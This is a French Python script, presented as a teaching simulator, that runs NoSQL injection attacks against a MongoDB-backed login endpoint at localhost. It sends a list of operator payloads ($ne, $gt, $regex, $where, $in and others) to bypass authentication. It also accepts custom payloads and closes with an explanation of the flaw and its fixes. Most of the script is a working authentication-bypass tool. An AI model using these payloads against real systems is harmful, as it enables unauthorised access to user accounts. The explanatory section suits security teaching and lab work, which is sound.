#!/usr/bin/env python3
"""
Attaque NoSQL Injection
Exploitation des requêtes MongoDB non sécurisées
"""

import requests
import json
from colorama import Fore, Style, init

init(autoreset=True)

TARGET_URL = "http://localhost/login"


def banner():
    print(f"""
{Fore.MAGENTA}╔═══════════════════════════════════════════════════╗
║       💉 NOSQL INJECTION ATTACK SIMULATOR        ║
║              POUR TESTS PÉDAGOGIQUES              ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def test_injection(payload_username, payload_password, description):
    """Teste une payload d'injection NoSQL"""
    print(f"\n{Fore.CYAN}[*] Test: {description}{Style.RESET_ALL}")
    print(f"    Username payload: {json.dumps(payload_username)}")
    print(f"    Password payload: {json.dumps(payload_password)}")
    
    try:
        response = requests.post(
            TARGET_URL,
            json={
                "username": payload_username,
                "password": payload_password
            },
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        
        print(f"    Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                print(f"{Fore.GREEN}    [✓] INJECTION RÉUSSIE !{Style.RESET_ALL}")
                print(f"    Message: {data.get('message')}")
                return True, data
            else:
                print(f"{Fore.YELLOW}    [!] Injection échouée: {data.get('message')}{Style.RESET_ALL}")
                return False, data
        else:
            print(f"{Fore.RED}    [✗] Échec (code {response.status_code}){Style.RESET_ALL}")
            return False, response.json()
    
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}    [✗] Erreur réseau: {str(e)}{Style.RESET_ALL}")
        return False, None
    except json.JSONDecodeError:
        print(f"{Fore.RED}    [✗] Réponse invalide{Style.RESET_ALL}")
        return False, None


def basic_injections():
    """Teste les injections NoSQL de base"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          📋 INJECTIONS NOSQL DE BASE             ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    injections = [
        {
            "username": {"$ne": None},
            "password": {"$ne": None},
            "description": "Bypass avec $ne (not equal) - username et password non null"
        },
        {
            "username": {"$ne": ""},
            "password": {"$ne": ""},
            "description": "Bypass avec $ne - username et password non vides"
        },
        {
            "username": {"$gt": ""},
            "password": {"$gt": ""},
            "description": "Bypass avec $gt (greater than) - toute valeur"
        },
        {
            "username": {"$regex": ".*"},
            "password": {"$regex": ".*"},
            "description": "Bypass avec $regex - expression régulière matchant tout"
        },
        {
            "username": {"$exists": True},
            "password": {"$exists": True},
            "description": "Bypass avec $exists - champs existants"
        },
        {
            "username": "admin",
            "password": {"$ne": None},
            "description": "Cibler 'admin' avec n'importe quel mot de passe"
        },
        {
            "username": {"$in": ["admin", "root", "user"]},
            "password": {"$ne": ""},
            "description": "Cibler plusieurs usernames avec $in"
        },
    ]
    
    successful = []
    
    for i, injection in enumerate(injections, 1):
        print(f"\n{Fore.WHITE}═══ Injection #{i}/{len(injections)} ══════════════════════════{Style.RESET_ALL}")
        success, data = test_injection(
            injection["username"],
            injection["password"],
            injection["description"]
        )
        
        if success:
            successful.append(injection)
    
    # Rapport
    print(f"\n\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║              📊 RAPPORT D'INJECTION               ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Statistiques:")
    print(f"  • Injections testées: {len(injections)}")
    print(f"  • Injections réussies: {len(successful)}")
    print(f"  • Taux de succès: {len(successful)/len(injections)*100:.1f}%{Style.RESET_ALL}")
    
    if successful:
        print(f"\n{Fore.GREEN}✓ Injections réussies:{Style.RESET_ALL}")
        for inj in successful:
            print(f"  • {inj['description']}")
    else:
        print(f"\n{Fore.YELLOW}Aucune injection n'a fonctionné (système peut-être protégé){Style.RESET_ALL}")


def advanced_injections():
    """Injections avancées pour extraction de données"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║         🎯 INJECTIONS NOSQL AVANCÉES             ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # Tenter d'extraire des usernames
    print(f"\n{Fore.YELLOW}[*] Tentative d'énumération des usernames...{Style.RESET_ALL}")
    
    # Test avec différents opérateurs
    advanced_payloads = [
        {
            "username": {"$where": "1==1"},
            "password": {"$where": "1==1"},
            "description": "JavaScript injection avec $where (très dangereux)"
        },
        {
            "username": {"$nin": [""]},
            "password": {"$nin": [""]},
            "description": "Bypass avec $nin (not in) - exclure valeur vide"
        },
        {
            "username": {"$or": [{"username": {"$ne": ""}}, {"username": {"$exists": True}}]},
            "password": {"$ne": ""},
            "description": "Injection complexe avec $or"
        }
    ]
    
    for i, payload in enumerate(advanced_payloads, 1):
        print(f"\n{Fore.WHITE}═══ Injection avancée #{i} ═══════════════════════{Style.RESET_ALL}")
        test_injection(
            payload["username"],
            payload["password"],
            payload["description"]
        )

def custom_injection():
    """Permet de tester une injection personnalisée"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          🛠️  INJECTION PERSONNALISÉE              ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Exemples de payloads:")
    print('  • {{"$ne": null}}')
    print('  • {{"$gt": ""}}')
    print('  • {{"$regex": "^admin"}}')
    print('  • "admin" (valeur normale){Style.RESET_ALL}\n')
    
    username_input = input(f"{Fore.CYAN}Payload username (JSON ou texte): {Style.RESET_ALL}")
    password_input = input(f"{Fore.CYAN}Payload password (JSON ou texte): {Style.RESET_ALL}")
    
    # Tenter de parser en JSON
    try:
        username_payload = json.loads(username_input)
    except:
        username_payload = username_input
    
    try:
        password_payload = json.loads(password_input)
    except:
        password_payload = password_input
    
    test_injection(username_payload, password_payload, "Injection personnalisée")


def explain_vulnerability():
    """Explique la vulnérabilité"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          📚 EXPLICATION DE LA VULNÉRABILITÉ      ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"""
{Fore.WHITE}🔍 Pourquoi cette attaque fonctionne ?

Le code vulnérable (backend/app.py):
{Fore.RED}
    user = users.find_one({{'username': username, 'password': password}})
{Fore.WHITE}
Cette requête MongoDB accepte directement les données de l'utilisateur
sans validation. Un attaquant peut envoyer des objets JSON au lieu
de simples chaînes de caractères.

Exemple d'attaque:
{Fore.YELLOW}
    POST /login
    {{"username": {{"$ne": null}}, "password": {{"$ne": null}}}}
{Fore.WHITE}
Cette requête devient en MongoDB:
{Fore.RED}
    users.find_one({{'username': {{'$ne': null}}, 'password': {{'$ne': null}}}})
{Fore.WHITE}
Qui signifie: "trouve un utilisateur dont le username ET le password
ne sont pas null" → match le premier utilisateur de la base !

🛡️ Comment se protéger ?
{Fore.GREEN}
1. Valider que username et password sont des chaînes:
   if not isinstance(username, str) or not isinstance(password, str):
       return error

2. Utiliser un système d'authentification sécurisé (bcrypt, JWT)

3. Ne jamais passer directement les entrées utilisateur à MongoDB

4. Implémenter un WAF (Web Application Firewall)
{Style.RESET_ALL}
    """)


def main():
    banner()
    
    print(f"{Fore.WHITE}Sélectionnez le type d'attaque:")
    print("1. Injections NoSQL de base (bypass auth)")
    print("2. Injections avancées")
    print("3. Injection personnalisée")
    print("4. Explication de la vulnérabilité")
    print("5. Quitter{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-7): {Style.RESET_ALL}")
    
    if choice == "1":
        basic_injections()
    elif choice == "2":
        advanced_injections()
    elif choice == "3":
        custom_injection()
    elif choice == "4":
        explain_vulnerability()
    elif choice == "5":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attaque interrompue{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")